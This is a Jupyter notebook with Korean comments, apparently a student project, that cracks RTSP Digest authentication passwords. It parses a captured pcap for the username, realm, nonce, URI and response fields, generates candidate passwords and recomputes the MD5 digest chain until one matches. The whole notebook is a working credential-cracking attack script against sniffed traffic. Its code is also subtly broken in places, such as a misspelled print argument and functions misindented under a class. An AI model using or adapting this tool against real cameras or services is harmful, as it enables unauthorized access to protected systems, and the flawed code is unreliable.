{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "13e71677",
      "metadata": {
        "id": "13e71677"
      },
      "outputs": [],
      "source": [
        "import os\n",
        "import re\n",
        "import sys\n",
        "import codecs\n",
        "import hashlib\n",
        "import itertools\n",
        "import time\n",
        "from scapy.all import *"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "d2b7864c",
      "metadata": {
        "id": "d2b7864c"
      },
      "outputs": [],
      "source": [
        "class Digest_password_cracker:\n",
        "    def __init__(self):\n",
        "        return None"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "10d103d4",
      "metadata": {
        "id": "10d103d4"
      },
      "outputs": [],
      "source": [
        "    def extract_packet_data(pcap_file_data):\n",
        "        # 찾아야 하는 바이트 열에 대한 패턴을 입력합니다.\n",
        "        method_pattern = \"(SETUP|DESCRIBE)\"\n",
        "        username_pattern = \"(username=\\\"([a-zA-Z0-9]+))\"\n",
        "        realm_pattern = \"(realm=\\\"([a-zA-Z0-9]+))\"\n",
        "        nonce_pattern = \"(nonce=\\\"([a-zA-Z0-9]+))\"\n",
        "        uri_pattern = \"(uri=\\\"(.+)\\\"\\,)\"\n",
        "        response_pattern = \"(response=\\\"([a-zA-Z0-9]+))\"\n",
        "\n",
        "        # 바이트열에서 찾아야 하는 값을 찾습니다.\n",
        "        method = re.search(method_pattern, pcap_file_data)\n",
        "        if method:\n",
        "            method = method.group(1)\n",
        "        else:\n",
        "            print(\"RTSP 연결 과정이 설정되지 않았습니다.\")\n",
        "            sys.exit(1)\n",
        "\n",
        "        username = re.search(username_pattern, pcap_file_data)\n",
        "        if username:\n",
        "            username = username.group(2)\n",
        "\n",
        "        realm = re.search(realm_pattern, pcap_file_data)\n",
        "        if realm:\n",
        "            realm = realm.group(2)\n",
        "\n",
        "        nonce = re.search(nonce_pattern, pcap_file_data)\n",
        "        if nonce:\n",
        "            nonce = nonce.group(2)\n",
        "\n",
        "        uri = re.search(uri_pattern, pcap_file_data)\n",
        "        if uri:\n",
        "            uri = uri.group(2)\n",
        "\n",
        "        response = re.search(response_pattern, pcap_file_data)\n",
        "        if response:\n",
        "            response = response.group(2)\n",
        "\n",
        "        return_data = {\n",
        "            'method':method,\n",
        "            'username':username,\n",
        "            'realm':realm,\n",
        "            'nonce':nonce,\n",
        "            'uri':uri,\n",
        "            'response':response\n",
        "        }\n",
        "\n",
        "        return return_data"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "be988f73",
      "metadata": {
        "id": "be988f73"
      },
      "outputs": [],
      "source": [
        "def get_password(length):\n",
        "    str_list = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' # 비밀번호를 생성할 문자열 시드\n",
        "    passwords = [] # 비밀번호를 저장\n",
        "\n",
        "    for length in range(1,length+1): # 비밀번호의 길이 생성\n",
        "        password_cycle = itertools.combinations(str_list,length) # 문자열의 조합 튜플 생성\n",
        "        for i in password_cycle: # 순회하면서, 튜플을 문자열로 변환\n",
        "            passwords.append(\"\".join(i))\n",
        "            \n",
        "    with open('./passwd.txt','w') as f:\n",
        "        f.writelines(passwords)\n",
        "        \n",
        "    return passwords"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "239e85e2",
      "metadata": {
        "id": "239e85e2"
      },
      "outputs": [],
      "source": [
        "    def calc_hash(packet_data, length):\n",
        "        # 딕셔너리로부터 데이터를 추출함\n",
        "        method = packet_data['method']\n",
        "        username = packet_data['username']\n",
        "        realm = packet_data['realm']\n",
        "        nonce = packet_data['nonce']\n",
        "        uri = packet_data['uri']\n",
        "        response = packet_data['response']\n",
        "        \n",
        "        passwords = get_password(length) # rute-Forcing 공격을 위한, 비밀번호 리스트 생성 \n",
        "        print(\"-\"*90)\n",
        "        print(\"비밀번호 리스트 생성 완료!!\")\n",
        "        print(\"-\"*90)\n",
        "        \n",
        "        # 두번째 단계: md5(METHOD:rtsp://ip/urn)\n",
        "        input_str = method+\":\"+uri\n",
        "        input_str = input_str.encode('utf-8')\n",
        "\n",
        "        md5_2 = hashlib.md5()\n",
        "        md5_2.update(input_str)\n",
        "        md5_2 = md5_2.hexdigest()\n",
        "        \n",
        "        password_cnt = 0\n",
        "        for password in passwords:\n",
        "            # 첫번째 단계: md5(username:realm:password)\n",
        "            input_str = username+\":\"+realm+\":\"+password\n",
        "            input_str = input_str.encode('utf-8')\n",
        "\n",
        "            md5_1 = hashlib.md5()\n",
        "            md5_1.update(input_str)\n",
        "            md5_1 = md5_1.hexdigest()\n",
        "\n",
        "            # 세번째 단계: md5(hash1:nonce:hash2)\n",
        "            input_str = md5_1+\":\"+nonce+\":\"+md5_2\n",
        "            input_str = input_str.encode('utf-8')\n",
        "\n",
        "            md5_3 = hashlib.md5()\n",
        "            md5_3.update(input_str)\n",
        "            md5_3 = md5_3.hexdigest()\n",
        "            \n",
        "            password_cnt = password_cnt + 1\n",
        "            print(\"\\r 비밀번호 대입 완료: {0} / {1}\".format(password_cnt,len(passwords)), ends=\"\")\n",
        "            \n",
        "            # 비밀번호를 찾은 경우\n",
        "            if md5_3 == response: \n",
        "                print(\"비밀번호를 찾았습니다!\")\n",
        "                print(\"비밀번호: \",password)\n",
        "                return 0\n",
        "            \n",
        "        # 비밀번호를 찾지 못한 경우\n",
        "        print(\"찾은 비밀번호가 없습니다. 길이를 늘려 시도해주세요.\")\n",
        "        return 0"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "d7e251a4",
      "metadata": {
        "id": "d7e251a4"
      },
      "outputs": [],
      "source": [
        "def main():\n",
        "    # pcap_file_dir = input(\"파일 경로를 입력해주세요.\")\n",
        "    # length = input(\"비밀번호의 길이를 입력해주세요.\")\n",
        "    length = 10\n",
        "\n",
        "    # 코드가 시작한 시간을 기록합니다.\n",
        "    start_time = time.time()\n",
        "\n",
        "    # PCAP 파일의 경로를 추출합니다.\n",
        "    pcap_file_dir = \"D://Virtual_Machine//VM_ImageFiles//kali-linux-2022.3-vmware-amd64//kali-linux-2022.3-vmware-amd64.vmwarevm//ShareFiles\"\n",
        "    pcap_file_names = os.listdir(pcap_file_dir)\n",
        "    print(\"-\"*90)\n",
        "    print(\".pcap 파일 경로 설정 완료!!\")\n",
        "\n",
        "    # PCAP 파일을 읽어들입니다.\n",
        "    pcap_file_data = \"\"\n",
        "    with codecs.open(os.path.join(pcap_file_dir,pcap_file_names[0]), 'r', encoding='utf-8', errors='ignore') as f:\n",
        "        pcap_file_data = f.read()\n",
        "    print(\"-\"*90)\n",
        "    print(\".pcap 파일 읽기 완료!!\")\n",
        "\n",
        "    # PCAP에서 필요한 데이터를 추출합니다.\n",
        "    packet_data = extract_packet_data(pcap_file_data)\n",
        "    print(\"-\"*90)\n",
        "    print(\".pcap 파일 데이터 추출 완료!!\")\n",
        "\n",
        "    # 해시값을 계산하며, 비밀번호를 찾습니다.\n",
        "    calc_hash(packet_data, length)\n",
        "\n",
        "    # 총 소요시간을 기록합니다.\n",
        "    end_time = time.time()\n",
        "    print(\"-\"*90)\n",
        "    print(\"총 소요시간: {0}\".format(end_time-start_time))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "eb94d207",
      "metadata": {
        "id": "eb94d207"
      },
      "outputs": [],
      "source": [
        "if __name__ == \"__main__\":\n",
        "    main()\n",
        "\n",
        "# 참고: 비밀번호를 생성하는 경우의 수가 많아, 메모리 오류가 나는 경우가 있습니다.\n",
        "# 이 경우, 코드를 구동하는 PC의 가상메모리를 늘려주시면 해결됩니다."
      ]
    },
    {
      "cell_type": "markdown",
      "id": "738da393",
      "metadata": {
        "id": "738da393"
      },
      "source": [
        "## 참고자료\n",
        "- [RTSP 인증 방식](https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&blogId=bcknightt&logNo=220006031922)\n",
        "- [Digest 방식](https://en.wikipedia.org/wiki/Digest_access_authentication)\n",
        "- [BruteForce 비밀번호 생성 참고](https://ruinick.tistory.com/13)\n",
        "\n",
        "## 제작정보\n",
        "- 제작자: 김동영 (klgh1256@s.hallym.ac.kr)\n",
        "- 제작일자: 2022년 08월 22일"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "4ede2c51",
      "metadata": {
        "id": "4ede2c51"
      },
      "outputs": [],
      "source": []
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3 (ipykernel)",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.9.12"
    },
    "colab": {
      "provenance": []
    }
  },
  "nbformat": 4,
  "nbformat_minor": 5
}